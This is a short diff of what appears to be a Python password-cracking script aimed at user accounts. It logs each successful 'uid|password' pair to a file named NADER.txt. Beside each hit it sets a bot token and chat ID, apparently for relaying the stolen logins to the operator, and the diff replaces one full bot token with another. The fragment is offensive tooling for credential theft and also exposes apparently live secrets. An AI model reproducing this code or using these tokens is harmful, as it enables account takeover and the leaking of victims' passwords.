@@ -1488,7 +1488,7 @@ class Main:
 
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				token = '6065926852:AAGTgYqvGbKAKqhSjB2WVetHPXgv4IYSOv8'
+				token = '6118299145:AAFxSlwEAsoJH9ylfjA8E4SE9546lOuS3k4'
 
 				ID = '5868677803'
 				
@@ -1511,7 +1511,7 @@ class Main:
 				
 				self.cp.append("%s|%s"%(uid, pw))
 				open("NADER.txt","a").write(" %s | %s\n"%(uid, pw))
-				token = '6065926852:AAGTgYqvGbKAKqhSjB2WVetHPXgv4IYSOv8'
+				token = '6118299145:AAFxSlwEAsoJH9ylfjA8E4SE9546lOuS3k4'
 
 				ID = '5868677803'
 
